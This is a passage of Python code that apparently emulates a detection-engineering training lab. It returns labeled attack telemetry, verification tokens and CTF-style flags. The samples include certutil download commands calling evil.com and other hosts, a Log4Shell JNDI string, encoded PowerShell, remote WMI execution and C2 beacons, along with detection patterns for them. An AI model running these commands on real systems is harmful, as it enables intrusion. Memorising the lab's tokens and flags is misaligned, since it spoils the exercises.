                    '    "msg": "Remote Command Execution: Unix Shell Command Found",\n'
                    '    "anomaly_score": 5,\n'
                    '    "paranoia_level": 1,\n'
                    '    "label": "ATTACK_RCE_UNIX_SHELL"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["modsec_crs_emulated"] = True
                return '{\n  "status": "MODSEC_CRS_VERIFIED",\n  "verification_token": "MODSEC_CRS_VERIFIED",\n  "rule_id": 942100\n}\n\n[+] Verification Token: MODSEC_CRS_VERIFIED\n'
            if "--tune-paranoia" in cmd:
                st["paranoia_tuned"] = True
                return '{\n  "status": "PARANOIA_LEVEL_TUNED_OK",\n  "message": "ModSecurity CRS paranoia level tuned: PL2 enabled with exclusions"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("modsec_crs_emulated") and st.get("paranoia_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["modsec_crs_validated"] = True
                return '{\n  "status": "MODSEC_CRS_VALIDATED",\n  "verification_token": "MODSEC_CRS_VALIDATED"\n}\n\n[+] Verification Token: MODSEC_CRS_VALIDATED\n'
            return "Usage: modsec_tuning_tool.py [--show-telemetry | --emulate-detection | --tune-paranoia | --challenge]\n"

        # Detection Engineering Room 11: Wazuh / OSSEC Rules & Decoders
        if "wazuh_decoders_tool" in cmd:
            st = get_detection_wazuh_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:01Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",\n'
                    '    "label": "ATTACK_FAILED_AUTH"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:03Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",\n'
                    '    "label": "ATTACK_BRUTEFORCE_BURST"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:15Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4415]: AUTH_SUCCESS user=operator src_ip=198.51.100.22 session=sess_9941",\n'
                    '    "label": "ATTACK_SUCCESS_AFTER_BURST"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:05:00Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4420]: HEALTH_CHECK status=OK latency=2ms",\n'
                    '    "label": "BENIGN_DAEMON_PROBE"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["wazuh_rules_emulated"] = True
                return '{\n  "status": "WAZUH_RULES_VERIFIED",\n  "verification_token": "WAZUH_RULES_VERIFIED",\n  "decoder_name": "custom_authd_decoder",\n  "alert_level": 7\n}\n\n[+] Verification Token: WAZUH_RULES_VERIFIED\n'
            if "--tune-decoder" in cmd:
                st["decoder_regex_tuned"] = True
                return '{\n  "status": "DECODER_REGEX_TUNED_OK",\n  "message": "Wazuh decoder regex tuned for flexible delimiter matching"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("wazuh_rules_emulated") and st.get("decoder_regex_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["wazuh_rules_validated"] = True
                return '{\n  "status": "WAZUH_RULES_VALIDATED",\n  "verification_token": "WAZUH_RULES_VALIDATED"\n}\n\n[+] Verification Token: WAZUH_RULES_VALIDATED\n'
            return "Usage: wazuh_decoders_tool.py [--show-telemetry | --emulate-detection | --tune-decoder | --challenge]\n"

        # Detection Engineering Room 12: Tuning Detections & Reducing False Positives
        if "false_positive_tool" in cmd:
            st = get_detection_false_positive_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\Scripts\\\\BackupNightly.ps1",\n'
                    '    "user": "NT AUTHORITY\\\\SYSTEM",\n'
                    '    "parent_process": "taskeng.exe",\n'
                    '    "label": "BENIGN_SCHEDULED_BACKUP"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAA...",\n'
                    '    "user": "CORP\\\\chethan",\n'
                    '    "parent_process": "winword.exe",\n'
                    '    "label": "ATTACK_MALICIOUS_OFFICE_SPAWN"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "cmd.exe",\n'
                    '    "command_line": "cmd.exe /c whoami /priv",\n'
                    '    "user": "CORP\\\\devuser",\n'
                    '    "parent_process": "vscode.exe",\n'
                    '    "label": "BENIGN_DEVELOPER_QUERY"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "certutil.exe",\n'
                    '    "command_line": "certutil.exe -urlcache -split -f http://198.51.100.4/beacon.bin C:\\\\temp\\\\b.bin",\n'
                    '    "user": "CORP\\\\victim1",\n'
                    '    "parent_process": "explorer.exe",\n'
                    '    "label": "ATTACK_CERTUTIL_DOWNLOAD"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["false_positive_emulated"] = True
                return '{\n  "status": "FALSE_POSITIVE_TUNING_VERIFIED",\n  "verification_token": "FALSE_POSITIVE_TUNING_VERIFIED",\n  "noise_ratio_pct": 68\n}\n\n[+] Verification Token: FALSE_POSITIVE_TUNING_VERIFIED\n'
            if "--tune-baseline" in cmd:
                st["baseline_tuned"] = True
                return '{\n  "status": "BASELINE_EXCLUSION_TUNED_OK",\n  "message": "Legitimate maintenance window and backup service accounts whitelisted"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("false_positive_emulated") and st.get("baseline_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["false_positive_validated"] = True
                return '{\n  "status": "FALSE_POSITIVE_TUNING_VALIDATED",\n  "verification_token": "FALSE_POSITIVE_TUNING_VALIDATED"\n}\n\n[+] Verification Token: FALSE_POSITIVE_TUNING_VALIDATED\n'
            return "Usage: false_positive_tool.py [--show-telemetry | --emulate-detection | --tune-baseline | --challenge]\n"

        # Detection Engineering Room 13: Baseline Profiling & Threshold-Based Detections
        if "threshold_tool" in cmd:
            st = get_detection_threshold_state(info.session_id)
            if "--show-events" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:00:00Z",\n'
                    '    "user": "svc_sql",\n'
                    '    "src_ip": "10.0.1.15",\n'
                    '    "auth_status": "SUCCESS",\n'
                    '    "hourly_mean": 2.1,\n'
                    '    "window_count": 2,\n'
                    '    "label": "BENIGN_SERVICE_ACCOUNT_AUTH"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:05:00Z",\n'
                    '    "user": "admin",\n'
                    '    "src_ip": "192.168.1.100",\n'
                    '    "auth_status": "FAILURE",\n'
                    '    "hourly_mean": 1.4,\n'
                    '    "window_count": 1,\n'
                    '    "label": "BENIGN_USER_TYPO"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:08:00Z",\n'
                    '    "user": "finance01",\n'
                    '    "src_ip": "10.0.2.45",\n'
                    '    "auth_status": "FAILURE",\n'
                    '    "hourly_mean": 1.2,\n'
                    '    "window_count": 87,\n'
                    '    "anomaly_flag": "THRESHOLD_EXCEEDED",\n'
                    '    "z_score": 6.8,\n'
                    '    "mitre_technique": "T1110.003",\n'
                    '    "label": "ATTACK_PASSWORD_SPRAY_SPIKE"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:12:00Z",\n'
                    '    "user": "devops_lead",\n'
                    '    "src_ip": "10.0.3.12",\n'
                    '    "auth_status": "SUCCESS",\n'
                    '    "hourly_mean": 4.5,\n'
                    '    "window_count": 5,\n'
                    '    "label": "BENIGN_DEVELOPER_AUTH"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["threshold_emulated"] = True
                return '{\n  "status": "THRESHOLD_DETECTION_VERIFIED",\n  "verification_token": "THRESHOLD_DETECTION_VERIFIED",\n  "metric": "auth_failures_per_user",\n  "window_seconds": 300,\n  "observed_peak": 87,\n  "baseline_threshold": 50\n}\n\n[+] Verification Token: THRESHOLD_DETECTION_VERIFIED\n'
            if "--tune-window" in cmd:
                st["window_tuned"] = True
                return '{\n  "status": "ROLLING_WINDOW_TUNED_OK",\n  "window_seconds": 300,\n  "threshold_count": 50,\n  "standard_deviation_band": "3-sigma"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("threshold_emulated") and st.get("window_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["threshold_validated"] = True
                return '{\n  "status": "THRESHOLD_DETECTION_VALIDATED",\n  "verification_token": "THRESHOLD_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: THRESHOLD_DETECTION_VALIDATED\n'
            return "Usage: threshold_tool.py [--show-events | --emulate-detection | --tune-window | --challenge]\n"

        # Detection Engineering Room 14: Correlation Rules: Multi-Event Detection
        if "correlation_rule_tool" in cmd:
            st = get_detection_correlation_state(info.session_id)
            if "--show-events" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "stage": 1,\n'
                    '    "telemetry": "email_gateway",\n'
                    '    "event": "phishing_attachment_delivered",\n'
                    '    "recipient": "victim@corp.local",\n'
                    '    "filename": "Invoice_Q3.docm",\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:00:10Z",\n'
                    '    "mitre_technique": "T1566.001",\n'
                    '    "label": "ATTACK_SPEARPHISHING_ATTACHMENT"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": 2,\n'
                    '    "telemetry": "edr_sysmon_1",\n'
                    '    "event": "process_creation",\n'
                    '    "process": "powershell.exe",\n'
                    '    "parent_process": "winword.exe",\n'
                    '    "command_line": "powershell.exe -ep bypass -nop -w hidden -enc JABjAGwAaQ...",\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:00:45Z",\n'
                    '    "mitre_technique": "T1059.001",\n'
                    '    "label": "ATTACK_MACRO_EXECUTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": 3,\n'
                    '    "telemetry": "network_zeek",\n'
                    '    "event": "outbound_connection",\n'
                    '    "dest_ip": "198.51.100.89",\n'
                    '    "dest_port": 4444,\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:01:05Z",\n'
                    '    "mitre_technique": "T1071.001",\n'
                    '    "label": "ATTACK_C2_BEACON"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-correlation" in cmd or "--emulate" in cmd:
                st["correlation_emulated"] = True
                return '{\n  "status": "CORRELATION_RULE_VERIFIED",\n  "verification_token": "CORRELATION_RULE_VERIFIED",\n  "chain_id": "CHAIN-T1566-T1059-T1071",\n  "stages_matched": 3,\n  "entity_key": "WS-0941"\n}\n\n[+] Verification Token: CORRELATION_RULE_VERIFIED\n'
            if "--tune-sequence" in cmd:
                st["sequence_tuned"] = True
                return '{\n  "status": "CORRELATION_SEQUENCE_TUNED_OK",\n  "join_key": "host.name",\n  "ordered": true,\n  "max_span_seconds": 600\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("correlation_emulated") and st.get("sequence_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["correlation_validated"] = True
                return '{\n  "status": "CORRELATION_RULE_VALIDATED",\n  "verification_token": "CORRELATION_RULE_VALIDATED"\n}\n\n[+] Verification Token: CORRELATION_RULE_VALIDATED\n'
            return "Usage: correlation_rule_tool.py [--show-events | --emulate-correlation | --tune-sequence | --challenge]\n"

        # Detection Engineering Room 15: Detection Testing with Unit Tests & Synthetic Logs
        if "detection_testing_tool" in cmd:
            st = get_detection_unit_testing_state(info.session_id)
            if "--show-fixtures" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "id": "FIX-POS-01",\n'
                    '    "type": "positive",\n'
                    '    "description": "Obfuscated PowerShell invocation from Office document",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",\n'
                    '      "command_line": "powershell.exe -enc SQBFAFgA...",\n'
                    '      "parent_image": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\winword.exe"\n'
                    '    },\n'
                    '    "expected_result": "MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-POS-02",\n'
                    '    "type": "positive",\n'
                    '    "description": "LOLBIN Certutil web file transfer",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '      "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe C:\\\\temp\\\\x.exe"\n'
                    '    },\n'
                    '    "expected_result": "MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-NEG-01",\n'
                    '    "type": "negative",\n'
                    '    "description": "Legitimate developer git command line",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Program Files\\\\Git\\\\bin\\\\git.exe",\n'
                    '      "command_line": "git.exe status",\n'
                    '      "parent_image": "C:\\\\Windows\\\\explorer.exe"\n'
                    '    },\n'
                    '    "expected_result": "NO_MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-NEG-02",\n'
                    '    "type": "negative",\n'
                    '    "description": "Legitimate maintenance command prompt",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '      "command_line": "cmd.exe /c echo hello",\n'
                    '      "parent_image": "C:\\\\Windows\\\\System32\\\\services.exe"\n'
                    '    },\n'
                    '    "expected_result": "NO_MATCH"\n'
                    '  }\n'
                    ']\n'
                )
            if "--run-tests" in cmd or "--emulate" in cmd:
                st["unit_test_emulated"] = True
                return '{\n  "status": "DETECTION_UNIT_TEST_VERIFIED",\n  "verification_token": "DETECTION_UNIT_TEST_VERIFIED",\n  "positive_tests_run": 2,\n  "positive_tests_passed": 2,\n  "negative_tests_run": 2,\n  "negative_tests_passed": 2,\n  "test_suite_status": "PASSED"\n}\n\n[+] Verification Token: DETECTION_UNIT_TEST_VERIFIED\n'
            if "--tune-fixtures" in cmd:
                st["fixtures_tuned"] = True
                return '{\n  "status": "FIXTURE_ASSERTIONS_TUNED_OK",\n  "regression_assertions": 4,\n  "code_coverage_pct": 100\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("unit_test_emulated") and st.get("fixtures_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["unit_test_validated"] = True
                return '{\n  "status": "DETECTION_UNIT_TEST_VALIDATED",\n  "verification_token": "DETECTION_UNIT_TEST_VALIDATED"\n}\n\n[+] Verification Token: DETECTION_UNIT_TEST_VALIDATED\n'
            return "Usage: detection_testing_tool.py [--show-fixtures | --run-tests | --tune-fixtures | --challenge]\n"

        # Detection Engineering Room 16: YARA Rules for File & Memory Threat Hunting
        if "yara_hunting_tool" in cmd:
            st = get_detection_yara_hunting_state(info.session_id)
            if "--show-samples" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "pid": 3812,\n'
                    '    "process": "svchost.exe",\n'
                    '    "allocated_region": "0x00400000 - 0x00450000",\n'
                    '    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",\n'
                    '    "extracted_strings": [\n'
                    '      "VirtualAlloc",\n'
                    '      "WriteProcessMemory",\n'
                    '      "CreateRemoteThread",\n'
                    '      "cmd.exe /c echo beaconing"\n'
                    '    ],\n'
                    '    "section_entropy": 7.82,\n'
                    '    "classification": "SUSPICIOUS_REFLECTIVE_DLL",\n'
                    '    "label": "ATTACK_MEMORY_INJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "pid": 1104,\n'
                    '    "process": "explorer.exe",\n'
                    '    "allocated_region": "0x7FF60000 - 0x7FF90000",\n'
                    '    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",\n'
                    '    "extracted_strings": [\n'
                    '      "ShellExecuteExW",\n'
                    '      "GetCommandLineW",\n'
                    '      "CreateWindowExW"\n'
                    '    ],\n'
                    '    "section_entropy": 5.12,\n'
                    '    "classification": "BENIGN_SYSTEM_PE",\n'
                    '    "label": "BENIGN_OS_BINARY"\n'
                    '  }\n'
                    ']\n'
                )
            if "--scan-memory" in cmd or "--emulate" in cmd:
                st["yara_emulated"] = True
                return '{\n  "status": "YARA_HUNTING_VERIFIED",\n  "verification_token": "YARA_HUNTING_VERIFIED",\n  "scanned_processes": 2,\n  "matched_rules": ["Hunt_Reflective_DLL_Injection"],\n  "matched_pids": [3812],\n  "pe_header_matched": true,\n  "wildcard_hex_matched": true\n}\n\n[+] Verification Token: YARA_HUNTING_VERIFIED\n'
            if "--tune-condition" in cmd:
                st["condition_tuned"] = True
                return '{\n  "status": "YARA_CONDITION_TUNED_OK",\n  "condition": "uint16(0) == 0x5A4D and (2 of ($s*) or $hex_pattern)",\n  "entropy_threshold": 7.0\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("yara_emulated") and st.get("condition_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["yara_validated"] = True
                return '{\n  "status": "YARA_HUNTING_VALIDATED",\n  "verification_token": "YARA_HUNTING_VALIDATED"\n}\n\n[+] Verification Token: YARA_HUNTING_VALIDATED\n'
            return "Usage: yara_hunting_tool.py [--show-samples | --scan-memory | --tune-condition | --challenge]\n"

        # Detection Engineering Room 17: Snort / Suricata Network Signatures
        if "suricata_tool" in cmd:
            st = get_detection_suricata_state(info.session_id)
            if "--show-events" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "packet_id": 90141,\n'
                    '    "timestamp": "2026-11-15T13:00:01Z",\n'
                    '    "proto": "TCP",\n'
                    '    "src_ip": "192.168.1.105",\n'
                    '    "src_port": 49812,\n'
                    '    "dst_ip": "198.51.100.22",\n'
                    '    "dst_port": 80,\n'
                    '    "flow": "to_server,established",\n'
                    '    "http_uri": "/api/v1/auth",\n'
                    '    "payload_snippet": "POST /api/v1/auth HTTP/1.1\\r\\nUser-Agent: ${jndi:ldap://evil.internal/a}\\r\\n",\n'
                    '    "mitre_technique": "T1071.001",\n'
                    '    "label": "ATTACK_JNDI_INJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "packet_id": 90142,\n'
                    '    "timestamp": "2026-11-15T13:00:05Z",\n'
                    '    "proto": "TCP",\n'
                    '    "src_ip": "10.0.1.12",\n'
                    '    "src_port": 50114,\n'
                    '    "dst_ip": "10.0.1.1",\n'
                    '    "dst_port": 443,\n'
                    '    "flow": "to_server,established",\n'
                    '    "http_uri": "/health",\n'
                    '    "payload_snippet": "GET /health HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n",\n'
                    '    "label": "BENIGN_INTERNAL_HEALTH_CHECK"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-signature" in cmd or "--emulate" in cmd:
                st["suricata_emulated"] = True
                return '{\n  "status": "SURICATA_SIGNATURE_VERIFIED",\n  "verification_token": "SURICATA_SIGNATURE_VERIFIED",\n  "inspected_packets": 2,\n  "matched_sids": [1000941],\n  "fast_pattern_hit": true,\n  "flow_state": "ESTABLISHED"\n}\n\n[+] Verification Token: SURICATA_SIGNATURE_VERIFIED\n'
            if "--tune-pcre" in cmd:
                st["pcre_tuned"] = True
                return '{\n  "status": "SURICATA_PCRE_TUNED_OK",\n  "pcre": "/\\\\$\\\\{jndi:(ldap[s]?|rmi|dns):/Ui",\n  "fast_pattern": "jndi"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("suricata_emulated") and st.get("pcre_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["suricata_validated"] = True
                return '{\n  "status": "SURICATA_SIGNATURE_VALIDATED",\n  "verification_token": "SURICATA_SIGNATURE_VALIDATED"\n}\n\n[+] Verification Token: SURICATA_SIGNATURE_VALIDATED\n'
            return "Usage: suricata_tool.py [--show-events | --emulate-signature | --tune-pcre | --challenge]\n"

        # Detection Engineering Room 18: Threat Hunting Hypothesis Formulation
        if "threat_hunting_tool" in cmd:
            st = get_detection_hunt_hypothesis_state(info.session_id)
            if "--show-corpus" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:10Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe /node:10.0.1.50 process call create \'powershell.exe -enc JABj...\'",\n'
                    '    "parent_process": "cmd.exe",\n'
                    '    "user": "CORP\\\\compromised_admin",\n'
                    '    "host_count": 1,\n'
                    '    "mitre_technique": "T1047",\n'
                    '    "label": "ATTACK_REMOTE_WMI_EXECUTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:20Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe OS get Caption,OSArchitecture",\n'
                    '    "parent_process": "SCCM_Client.exe",\n'
                    '    "user": "NT AUTHORITY\\\\SYSTEM",\n'
                    '    "host_count": 850,\n'
                    '    "label": "BENIGN_SCCM_INVENTORY_QUERY"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-hunt" in cmd or "--emulate" in cmd:
                st["hunt_emulated"] = True
                return '{\n  "status": "THREAT_HUNT_HYPOTHESIS_VERIFIED",\n  "verification_token": "THREAT_HUNT_HYPOTHESIS_VERIFIED",\n  "hypothesis": "Adversary abuses WMI process call create for lateral execution",\n  "stacking_anomaly_detected": true,\n  "rare_frequency_score": 1\n}\n\n[+] Verification Token: THREAT_HUNT_HYPOTHESIS_VERIFIED\n'
            if "--tune-hypothesis" in cmd:
                st["hypothesis_tuned"] = True
                return '{\n  "status": "HUNT_HYPOTHESIS_TUNED_OK",\n  "baseline_exclusion": "parent_process: SCCM_Client.exe AND command_line: OS get Caption*"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("hunt_emulated") and st.get("hypothesis_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["hunt_validated"] = True
                return '{\n  "status": "THREAT_HUNT_HYPOTHESIS_VALIDATED",\n  "verification_token": "THREAT_HUNT_HYPOTHESIS_VALIDATED"\n}\n\n[+] Verification Token: THREAT_HUNT_HYPOTHESIS_VALIDATED\n'
            return "Usage: threat_hunting_tool.py [--show-corpus | --emulate-hunt | --tune-hypothesis | --challenge]\n"

        # Detection Engineering Room 20: Detection Engineering Capstone: Production Pipeline
        if "capstone_pipeline_tool" in cmd:
            st = get_detection_capstone_state(info.session_id)
            if "--show-pipeline" in cmd:
                return (
                    '{\n'
                    '  "enterprise_grid": "VoltCorp Global SOC Infrastructure",\n'
                    '  "threat_scenario": "Adversary LSASS Credential Access & Multi-Stage Lateral Movement",\n'
                    '  "mitre_technique": "T1003.001",\n'
                    '  "active_layers": [\n'
                    '    {\n'
                    '      "layer": 1,\n'
                    '      "type": "Network Intrusion (Suricata)",\n'
                    '      "monitored_subnets": 12,\n'
                    '      "active_rules": 420\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 2,\n'
                    '      "type": "Host Behavioral (Sigma / EDR)",\n'
                    '      "monitored_hosts": 1250,\n'
                    '      "active_rules": 185\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 3,\n'
                    '      "type": "Memory & File Hunting (YARA)",\n'
                    '      "scanned_endpoints": 1250,\n'
                    '      "active_rules": 64\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 4,\n'
                    '      "type": "Correlation & Alerting (SIEM)",\n'
                    '      "correlation_chains": 18,\n'
                    '      "status": "SYNCHRONIZED"\n'
                    '    }\n'
                    '  ],\n'
                    '  "status": "ENTERPRISE_PIPELINE_ONLINE"\n'
                    '}\n'
                )
            if "--emulate-production" in cmd or "--emulate-capstone" in cmd or "--emulate" in cmd:
                st["capstone_emulated"] = True
                return '{\n  "status": "CAPSTONE_PIPELINE_VERIFIED",\n  "verification_token": "CAPSTONE_PIPELINE_VERIFIED",\n  "true_positive_rate_pct": 100,\n  "false_positive_rate_pct": 0,\n  "transpilation_status": "ALL_BACKENDS_SYNCHRONIZED"\n}\n\n[+] Verification Token: CAPSTONE_PIPELINE_VERIFIED\n'
            if "--tune-production" in cmd or "--tune" in cmd:
                st["production_tuned"] = True
                return '{\n  "status": "CAPSTONE_PRODUCTION_TUNED_OK",\n  "soc_playbook": "VERIFIED_ATTACHED",\n  "mitre_coverage_score": 100\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("capstone_emulated") and st.get("production_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["capstone_validated"] = True
                return '{\n  "status": "CAPSTONE_PIPELINE_VALIDATED",\n  "verification_token": "CAPSTONE_PIPELINE_VALIDATED"\n}\n\n[+] Verification Token: CAPSTONE_PIPELINE_VALIDATED\n'
            return "Usage: capstone_pipeline_tool.py [--show-pipeline | --emulate-production | --tune-production | --challenge]\n"

        # Detection Engineering Room 19: CI/CD Pipelines for Detection Rules
        if "pipeline_tool" in cmd and "capstone_pipeline_tool" not in cmd:
            st = get_detection_pipeline_state(info.session_id)
            if "--show-definition" in cmd:
                return (
                    '{\n'
                    '  "pipeline_name": "detection-as-code-ci-cd",\n'
                    '  "version_control": "GitLab CI / GitHub Actions",\n'
                    '  "stages": [\n'
                    '    "lint",\n'
                    '    "test",\n'
                    '    "security-review",\n'
                    '    "deploy"\n'
                    '  ],\n'
                    '  "rules_in_pipeline": [\n'
                    '    {\n'
                    '      "rule_id": "sigma-proc-01",\n'
                    '      "name": "PowerShell Encoded Download",\n'
                    '      "format": "Sigma YAML v2.0",\n'
                    '      "mitre_technique": "T1195.002",\n'
                    '      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]\n'
                    '    },\n'
                    '    {\n'
                    '      "rule_id": "sigma-proc-02",\n'
                    '      "name": "Certutil LOLBIN Web Request",\n'
                    '      "format": "Sigma YAML v2.0",\n'
                    '      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]\n'
                    '    }\n'
                    '  ],\n'
                    '  "status": "PIPELINE_STAGES_LOADED"\n'
                    '}\n'
                )
            if "--emulate-pipeline" in cmd or "--emulate" in cmd:
                st["pipeline_emulated"] = True
                return '{\n  "status": "DETECTION_PIPELINE_VERIFIED",\n  "verification_token": "DETECTION_PIPELINE_VERIFIED",\n  "stage_lint": "PASSED",\n  "stage_test": "PASSED",\n  "stage_transpilation": "PASSED"\n}\n\n[+] Verification Token: DETECTION_PIPELINE_VERIFIED\n'
            if "--tune-pipeline" in cmd or "--tune-gate" in cmd or "--tune" in cmd:
                st["pipeline_tuned"] = True
                return '{\n  "status": "PIPELINE_GATE_TUNED_OK",\n  "branch_protection": "STRICT_MERGE_REQUIRES_REVIEW_AND_PASSING_TESTS",\n  "automated_rollback": "ENABLED"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("pipeline_emulated") and st.get("pipeline_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["pipeline_validated"] = True
                return '{\n  "status": "DETECTION_PIPELINE_VALIDATED",\n  "verification_token": "DETECTION_PIPELINE_VALIDATED"\n}\n\n[+] Verification Token: DETECTION_PIPELINE_VALIDATED\n'
            return "Usage: pipeline_tool.py [--show-definition | --emulate-pipeline | --tune-pipeline | --challenge]\n"

        if cmd.startswith("strings "):
            return (
                "VoltStage2_Payload\n"
                "http://c2-stage.voltcorp.internal/gate.php\n"
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
                "VirtualAlloc\n"
                "WriteProcessMemory\n"
                "CreateRemoteThread\n"
            )

        # 5. Process Inspection (ps)
        if cmd in ("ps", "ps aux", "ps -ef") or "ps " in cmd:
            return (
                "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
                "operator     1  0.0  0.1   1680   820 ?        Ss   12:00   0:00 /bin/sh /home/operator/entrypoint.sh\n"
                "operator    22  0.0  1.2  28410 12400 ?        S    12:00   0:00 python3 shadow_agent --token NOENTRY{linux_process_inspection_7741}\n"
                "operator    45  0.0  0.1   1520   710 pts/0    R+   12:01   0:00 ps aux\n"
            )

        # 6. Stream Filtering (grep)
        if "grep " in cmd:
            if "SECURITY_FLAG" in cmd:
                return "[2026-11-14T10:14:22.091Z] [AUDIT_SYSTEM] [INFO] SECURITY_FLAG: NOENTRY{linux_grep_stream_mastery_5239} | Host: op-station-01\n"
            if "shadow_agent" in cmd:
                return "operator    22  0.0  1.2  28410 12400 ?        S    12:00   0:00 python3 shadow_agent --token NOENTRY{linux_process_inspection_7741}\n"
            if "Failed password" in cmd:
                return (
                    "Nov 14 08:14:10 target sshd[1041]: Failed password for invalid user admin from 192.0.2.144 port 41202 ssh2\n"
